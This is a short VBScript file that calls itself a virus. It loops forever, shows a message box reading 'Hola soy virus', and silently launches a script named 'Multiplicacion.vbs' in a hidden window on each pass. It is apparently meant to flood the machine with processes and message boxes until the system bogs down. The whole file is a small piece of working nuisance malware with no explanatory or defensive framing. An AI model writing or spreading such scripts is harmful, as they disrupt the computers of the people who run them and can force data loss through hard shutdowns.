do
msgbox "Hola soy virus", 48
Set wshshell = CreateObject("wscript.Shell")
wshshell.Run chr(34) & "Multiplicacion.vbs" & Chr(34), 0
Set wshShell = Nothing 
loop